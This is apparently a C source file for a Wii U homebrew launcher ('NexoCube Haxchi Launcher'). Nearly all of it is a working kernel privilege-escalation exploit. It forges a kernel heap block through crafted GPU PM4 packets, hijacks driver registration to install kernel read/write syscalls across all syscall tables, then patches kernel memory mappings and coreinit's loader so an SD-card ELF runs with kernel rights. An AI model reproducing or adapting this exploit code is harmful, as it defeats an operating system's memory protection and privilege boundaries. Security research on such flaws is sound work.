#include "imports.h"
#include "elf_abi.h"
#include "sd_loader.h"
#include "common.h"
#include "elf_stuff.h"

/* a sexy shade of grey :P */
#define COLOR_CONSTANT 0x40404040

#define BAT_SETUP_HOOK_ADDR         0xFFF1D624
#define BAT_SET_NOP_ADDR_1          0xFFF06B6C
#define BAT_SET_NOP_ADDR_2          0xFFF06BF8
#define BAT_SET_NOP_ADDR_3          0xFFF003C8
#define BAT_SET_NOP_ADDR_4          0xFFF003CC
#define BAT_SET_NOP_ADDR_5          0xFFF1D70C
#define BAT_SET_NOP_ADDR_6          0xFFF1D728
#define BAT_SET_NOP_ADDR_7          0xFFF1D82C
#define BAT_SET_NOP_ADDR_8          0xFFEE11C4
#define BAT_SET_NOP_ADDR_9          0xFFEE11C8
#define BAT_SETUP_HOOK_ENTRY        0x00800000
#define BAT4U_VAL                   0x008000FF
#define BAT4L_VAL                   0x30800012
#define NOP_ADDR(addr) \
		*(uint32_t*)addr = 0x60000000; \
		asm volatile("dcbf 0, %0; icbi 0, %0" : : "r" (addr & ~31));


/* Coreinit patch constants */
#define ROOTRPX_DBAT0U_VAL							0xC00003FF
#define COREINIT_DBAT0U_VAL							0xC20001FF
#define ROOTRPX_DBAT0L_VAL							0x30000012
#define COREINIT_DBAT0L_VAL							0x32000012
#define LIB_RW										0xC1000000
#define CODE_RW 									0xC0000000
#define COREINIT_JUMP_TO_OUR_CODE					0x0101C56C
#define COREINIT_RWX_MEM							0x011DD000

/* Kernel constants */
#define JIT_ADDRESS			        				0x01800000
#define CODE_ADDRESS_START							0x0D800000
#define CODE_ADDRESS_END							0x0F848A0C
#define KERN_HEAP                                   0xFF200000
#define KERN_HEAP_PHYS                              0x1B800000

#define KERN_SYSCALL_TBL_1                          0xFFE84C70 // unknown
#define KERN_SYSCALL_TBL_2                          0xFFE85070 // works with games
#define KERN_SYSCALL_TBL_3                          0xFFE85470 // works with loader
#define KERN_SYSCALL_TBL_4                          0xFFEAAA60 // works with home menu
#define KERN_SYSCALL_TBL_5                          0xFFEAAE60 // works with browser (previously KERN_SYSCALL_TBL)

#define KERN_CODE_READ			                    0xFFF023D4
#define KERN_CODE_WRITE			                    0xFFF023F4
#define KERN_ADDRESS_TBL		                    0xFFEAB7A0
#define KERN_DRVPTR				    				0xFFEAB530

#define MEM_SEMAPHORE 		0x39
#define WAIT_REG_MEM 		0x3C
#define MEM_WRITE 			0x3D
#define CP_INTERRUPT 		0x40
#define SURFACE_SYNC 		0x43
#define COND_WRITE 			0x45

#define SIGNAL_SEMAPHORE 	(6 << 29)
#define WAIT_SEMAPHORE 		(7 << 29)

typedef struct _heap_ctxt_t
{
	uint32_t base;
	uint32_t end;
	int first_index;
	int last_index;
	uint32_t unknown;
} heap_ctxt_t;

typedef struct _heap_block
{
	uint32_t addr;
	uint32_t size;
	uint32_t prev_idx;
	uint32_t next_idx;
} heap_block_t;

typedef struct _OSDriver
{
	char name[0x40];
	uint32_t unknown;
	uint32_t save_area;
	struct _OSDriver *next_drv;
} OSDriver; // Size = 0x4c

#define STARTID_OFFSET								0x08
#define METADATA_OFFSET								0x14
#define METADATA_SIZE								0x10

/* Random stuff */
#define AFF_CPU0 									(1 << 0)
#define AFF_CPU1 									(1 << 1)
#define AFF_CPU2 									(1 << 2)

int sy = 0;
u32* framebuffer_drc;
u32 framebuffer_drc_size;

void *find_gadget(uint32_t code[], uint32_t length, uint32_t gadgets_start);
int CompareMemory(void *ptr1, void *ptr2, uint32_t length);
void* memcpy(void* dst, const void* src, uint32_t size);
uint32_t kern_read(const void *addr);
void kern_write(void *addr, uint32_t value);

void ScreenInit()
{
	OSScreenInit();
	framebuffer_drc_size = OSScreenGetBufferSizeEx(1);
	framebuffer_drc = (u32*)0xF4000000;
	OSScreenSetBufferEx(1, framebuffer_drc);
}

void ScreenClear()
{
	OSScreenClearBufferEx(1, COLOR_CONSTANT);
	OSScreenFlipBuffersEx(1);
	sy = 0;
}

void print(const char *msg)
{

	int i;
	for(i = 0; i < 2; i++)
	{
		OSScreenPutFontEx(1, 0, sy, msg);
		OSScreenFlipBuffersEx(1);
	}

	sy++;
}

uint32_t make_pm4_type3_packet_header(uint32_t opcode, uint32_t count)
{
	uint32_t hdr = 0;					// bit[7:1]   = reserved | bit0 = predicate (should be 0)
	hdr += (3 << 30); 					// bit[31:30] = 3 -> type3 header
	hdr += ((count-1) << 16);			// bit[29:16] = (Number of DWORD) - 1
	hdr += (opcode << 8);				// bit[15:8]  = OPCODE			

	return hdr;
	
}


void return_to_sysmenu()
{
	OSExitThread(0);
}

/* pygecko intsaller */
uint32_t doBL( uint32_t where, unsigned int from ){
	uint32_t newval = (where - from);
	newval &= 0x03FFFFFC;
	newval |= 0x48000001;
	return newval;
}

/* Stolen from multiple sources, not sure who the author is, but it's very likely to be from dimok789 */
static void KernelCopyData(unsigned int addr, unsigned int src, unsigned int len)
{
	/*
	* Setup a DBAT access for our 0xC0800000 area and our 0xBC000000 area which hold our variables like GAME_LAUNCHED and our BSS/rodata section
	*/
	register uint32_t dbatu0 = 0, dbatl0 = 0, target_dbat0u = 0, target_dbat0l = 0;
	// setup mapping based on target address
	if ((addr >= 0xC0000000) && (addr < 0xC2000000)) // root.rpx address
	{
		target_dbat0u = ROOTRPX_DBAT0U_VAL;
		target_dbat0l = ROOTRPX_DBAT0L_VAL;
	}
	else if ((addr >= 0xC2000000) && (addr < 0xC3000000))
	{
		target_dbat0u = COREINIT_DBAT0U_VAL;
		target_dbat0l = COREINIT_DBAT0L_VAL;
	}
	// save the original DBAT value
	asm volatile("mfdbatu %0, 0" : "=r" (dbatu0));
	asm volatile("mfdbatl %0, 0" : "=r" (dbatl0));
	asm volatile("mtdbatu 0, %0" : : "r" (target_dbat0u));
	asm volatile("mtdbatl 0, %0" : : "r" (target_dbat0l));
	asm volatile("eieio; isync");

	unsigned char *src_p = (unsigned char*)src;
	unsigned char *dst_p = (unsigned char*)addr;

	unsigned int i;
	for(i = 0; i < len; i++)
	{
		dst_p[i] = src_p[i];
	}

	unsigned int flushAddr = addr & ~31;

	while(flushAddr < (addr + len))
	{
		asm volatile("dcbf 0, %0; sync" : : "r"(flushAddr));
		flushAddr += 0x20;
	}

	/*
	 * Restore original DBAT value
	 */
	asm volatile("mtdbatu 0, %0" : : "r" (dbatu0));
	asm volatile("mtdbatl 0, %0" : : "r" (dbatl0));
	asm volatile("eieio; isync");
}

extern void Syscall_0x25(void* addr, void* src, unsigned int len);
extern void Syscall_0x36(void);
extern void Syscall_0x14(void);
extern void Syscall_0x26(void);
extern void KernelPatches(void);

void *memset (void *dest, int val, size_t len)
{
	unsigned char *ptr = dest;
	while (len-- > 0)
		*ptr++ = val;
	return dest;
}

/*
*
*
*
*
*
*
*
*
*
*	Acutal code starts here
*
*
*
*
*
*
*
*
*
*
*/

#define COREINIT(x) (x - 0xFE3C00) // From IDA
const char* welcome_message = "NexoCube Haxchi Launcher v0.1-beta";

uint32_t (*OSDriver_Register)(char *driver_name, uint32_t name_length, void *buf1, void *buf2);
uint32_t (*OSDriver_Deregister)(char *driver_name, uint32_t name_length);
uint32_t (*OSDriver_CopyToSaveArea)(char *driver_name, uint32_t name_length, void *buf1, uint32_t size);

void PPC_Kernel_Exploit()
{

	char drvname[6] = {'D', 'R', 'V', 'H', 'A', 'X'};

	os_sleep(1);
	OSDriver_Register = (uint32_t (*)(char*, uint32_t, void*, void*))0x010277B8;
	OSDriver_Deregister = (uint32_t (*)(char*, uint32_t))0x010277C4;
	OSDriver_CopyToSaveArea = (uint32_t (*)(char*, uint32_t, void*, uint32_t))0x010277DC;

	OSContext *thread1 = (OSContext*)OSAllocFromSystem(0x1000, 32);
	uint32_t *tdstack1 = (uint32_t *)OSAllocFromSystem(0x1000, 4);

	/* *** Shutdown GX2 on its running core *** */
	OSCreateThread(thread1, GX2Shutdown, 0, NULL, (uint32_t)tdstack1 + 0x400, 0x1000, 0, (1 << GX2GetMainCoreId()) | 0x10);
	OSResumeThread(thread1);

	unsigned int t1 = 0x08FFFFFF;
	while(t1--);

	GX2Init(NULL);

	/* Initialize OSScreen stuff */
	ScreenInit();
	ScreenClear();

	print(welcome_message);

	print("\nRunning the PPC Kernel Exploit ...");

	/* Our next kernel allocation (<= 0x4C) will be here */
	OSDriver *driverhax =  (OSDriver*)OSAllocFromSystem(sizeof(OSDriver), 4);

	/* Setup our fake heap block in the userspace at 0x1F200014 */
	heap_block_t *heap_blk = (heap_block_t*)0x1F200014;
	heap_blk->addr = (uint32_t)driverhax;
	heap_blk->size = -0x4c;
	heap_blk->prev_idx = -1;
	heap_blk->next_idx = -1;

	DCFlushRange(heap_blk, 0x10);

	/* Crafting our GPU packet */
	uint32_t *pm4_packet = (uint32_t *)OSAllocFromSystem(32, 32);
	pm4_packet[0] = make_pm4_type3_packet_header(MEM_SEMAPHORE, 2);
	pm4_packet[1] = KERN_HEAP_PHYS + STARTID_OFFSET;
	pm4_packet[2] = SIGNAL_SEMAPHORE;

	for (int i = 0; i < 5; ++i)
		pm4_packet[3 + i] = 0x80000000;
	
	DCFlushRange(pm4_packet, 32);

	GX2DirectCallDisplayList(pm4_packet, 32); // += 0x01000000
	GX2DirectCallDisplayList(pm4_packet, 32); // += 0x01000000

	GX2Flush();

	OSDriver_Register(drvname, 6, NULL, NULL);

	/* Install our kernel RW syscalls everywhere */
	uint32_t syscalls[2] = {KERN_CODE_READ, KERN_CODE_WRITE};

	driverhax->save_area = (uint32_t) KERN_SYSCALL_TBL_1 + (0x34*4);
	OSDriver_CopyToSaveArea(drvname, 6, syscalls, 8);

	driverhax->save_area = (uint32_t) KERN_SYSCALL_TBL_2 + (0x34*4);
	OSDriver_CopyToSaveArea(drvname, 6, syscalls, 8);

	driverhax->save_area = (uint32_t) KERN_SYSCALL_TBL_3 + (0x34*4);
	OSDriver_CopyToSaveArea(drvname, 6, syscalls, 8);

	driverhax->save_area = (uint32_t) KERN_SYSCALL_TBL_4 + (0x34*4);
	OSDriver_CopyToSaveArea(drvname, 6, syscalls, 8);

	driverhax->save_area = (uint32_t) KERN_SYSCALL_TBL_5 + (0x34*4);
	OSDriver_CopyToSaveArea(drvname, 6, syscalls, 8);

	/* Clean up the kernel */
	kern_write((void*)KERN_HEAP + STARTID_OFFSET, 0);
	kern_write((void*)KERN_DRVPTR, (uint32_t)driverhax->next_drv);

}

void WritePriviledgedConstants()
{
	
	// save the original DBAT value
	register int dbatu0, dbatl0;

	asm volatile("mfdbatu %0, 0" : "=r" (dbatu0));
	asm volatile("mfdbatl %0, 0" : "=r" (dbatl0));

	asm volatile("mtdbatu 0, %0" : : "r" (0x010000FF));
	asm volatile("mtdbatl 0, %0" : : "r" (0x32000012));

    asm volatile("mtdbatu 5, %0" : : "r" (0x008000FF));
    asm volatile("mtdbatl 5, %0" : : "r" (0x30800012));

	asm volatile("eieio; isync");

	OS_FIRMWARE = 550;
	MAIN_ENTRY_ADDR = 0xDEADC0DE;
	ELF_DATA_ADDR = 0xDEADC0DE;
	ELF_DATA_SIZE = 0;
	memset(SD_LOADER_PATH, 0, 250);
	SD_LOADER_FORCE_HBL = 1;

	OS_SPECIFICS->addr_OSDynLoad_Acquire = (uint32_t)OSDynLoad_Acquire;
    OS_SPECIFICS->addr_OSDynLoad_FindExport = (uint32_t)OSDynLoad_FindExport;

    OS_SPECIFICS->addr_KernSyscallTbl1 = KERN_SYSCALL_TBL_1;
    OS_SPECIFICS->addr_KernSyscallTbl2 = KERN_SYSCALL_TBL_2;
    OS_SPECIFICS->addr_KernSyscallTbl3 = KERN_SYSCALL_TBL_3;
    OS_SPECIFICS->addr_KernSyscallTbl4 = KERN_SYSCALL_TBL_4;
    OS_SPECIFICS->addr_KernSyscallTbl5 = KERN_SYSCALL_TBL_5;

    OS_SPECIFICS->LiWaitIopComplete = (int (*)(int, int *))0x01010180;
    OS_SPECIFICS->LiWaitIopCompleteWithInterrupts = (int (*)(int, int *))0x0101006C;
    OS_SPECIFICS->addr_LiWaitOneChunk = 0x0100080C;
    OS_SPECIFICS->addr_PrepareTitle_hook = 0xFFF184E4;
    OS_SPECIFICS->addr_sgIsLoadingBuffer = 0xEFE19E80;
    OS_SPECIFICS->addr_gDynloadInitialized = 0xEFE13DBC;
    OS_SPECIFICS->orig_LiWaitOneChunkInstr = *(uint32_t*)0x0100080C;

    OS_SPECIFICS->addr_OSTitle_main_entry = 0x1005E040;

    uint8_t *flushAddr = (uint8_t*)0x00800000;

	while(flushAddr < (uint8_t*)0x00802000)
	{
		asm volatile("dcbf 0, %0; sync" : : "r"(flushAddr));
		flushAddr += 0x20;
	}

	asm volatile("eieio; isync");

	asm volatile("mtdbatu 0, %0" : : "r" (dbatu0));
	asm volatile("mtdbatl 0, %0" : : "r" (dbatl0));

	asm volatile("eieio; isync");
}

void _main()
{

	/* Dynamically linking functions (imports.c) */
	InitFuncPtrs();

	VPADData vpaddata;
	int error = 0;
	VPADRead(0, &vpaddata, 1, &error);

	/* Emergency exit */
	if(vpaddata.btn_hold & BUTTON_HOME)
	{

		_SYSLaunchTitleWithStdArgsInNoSplash(_SYSGetSystemApplicationTitleId(0), NULL);

		return_to_sysmenu();

	}

	/* Do The PPC Kernel Exploit */
	PPC_Kernel_Exploit();

	print("We're done ! Patching the kernel now ...");

	/* Patch kernel syscalls and memory mappings */
	kern_write((void*)(KERN_ADDRESS_TBL + (0x12 *4)), 0x31000000);
	kern_write((void*)(KERN_ADDRESS_TBL + (0x13 *4)), 0x28305800);
	kern_write((void*)(KERN_SYSCALL_TBL_2 + (0x25 * 4)), (unsigned int)KernelCopyData);
	kern_write((void*)(KERN_SYSCALL_TBL_2 + (0x26 * 4)), (unsigned int)WritePriviledgedConstants);
	kern_write((void*)(KERN_SYSCALL_TBL_2 + (0x36 * 4)), (unsigned int)KernelPatches);

	print("EZClap. Loading our homebrew launcher ...");

	print("");
	print("");

	/* Write SD Loader to memory and have fun :) */
	uint8_t* LoaderELF = (uint8_t *)sd_loader_sd_loader_elf;
	install_section(LoaderELF, ".text");
	install_section(LoaderELF, ".rodata");
	install_section(LoaderELF, ".data");
	install_section(LoaderELF, ".bss");

	print("Patching memory addressing ...");

	/* Patch Kernel so our BATs can rest in peace */
	Syscall_0x36();

	print("Writing constants ...");

	Syscall_0x26();

	print("Patching coreinit's loader ...");

	Elf32_Ehdr *ehdr = (Elf32_Ehdr *)sd_loader_sd_loader_elf;
    uint32_t ReplacementInstruction = 0x48000003 | (ehdr->e_entry & 0x03FFFFFC);

    Syscall_0x25((void*)(LIB_RW + COREINIT_JUMP_TO_OUR_CODE), &ReplacementInstruction, 4);
	ICInvalidateRange((void*)COREINIT_JUMP_TO_OUR_CODE, 4);

	print("\nDone, exiting ...");

	os_sleep(1);

	/* Acquire sysapp functions */
	int sysapp_handle = 0;
	OSDynLoad_Acquire("sysapp.rpl", &sysapp_handle);

	void (*SYSLaunchMiiStudio)(void) = 0;
	void (*SYSLaunchMenu)() = 0;

	OSDynLoad_FindExport(sysapp_handle, 0, "SYSLaunchMenu", &SYSLaunchMenu);
	OSDynLoad_FindExport(sysapp_handle, 0, "SYSLaunchMiiStudio", &SYSLaunchMiiStudio);

	SYSLaunchMiiStudio();

	GX2Shutdown();

	return_to_sysmenu();

}

/* Read a 32-bit word with kernel permissions */
uint32_t __attribute__ ((noinline)) kern_read(const void *addr)
{
	uint32_t result;
	asm volatile (
		"li 3,1\n"
		"li 4,0\n"
		"li 5,0\n"
		"li 6,0\n"
		"li 7,0\n"
		"lis 8,1\n"
		"mr 9,%1\n"
		"eieio\n"
		"sync\n"
		"li 0,0x3400\n"
		"mr %0,1\n"
		"sc\n"
		"nop\n"
		"mr 1,%0\n"
		"mr %0,3\n"
		:	"=r"(result)
		:	"b"(addr)
		:	"memory", "ctr", "lr", "0", "3", "4", "5", "6", "7", "8", "9", "10",
			"11", "12"
	);

	return result;
}

/* Write a 32-bit word with kernel permissions */
void __attribute__ ((noinline)) kern_write(void *addr, uint32_t value)
{
	asm volatile (
		"li 3,1\n"
		"li 4,0\n"
		"mr 5,%1\n"
		"li 6,0\n"
		"li 7,0\n"
		"lis 8,1\n"
		"mr 9,%0\n"
		"mr %1,1\n"
		"eieio\n"
		"sync\n"
		"li 0,0x3500\n"
		"sc\n"
		"nop\n"
		"mr 1,%1\n"
		:
		:	"r"(addr), "r"(value)
		:	"memory", "ctr", "lr", "0", "3", "4", "5", "6", "7", "8", "9", "10",
			"11", "12"
		);
}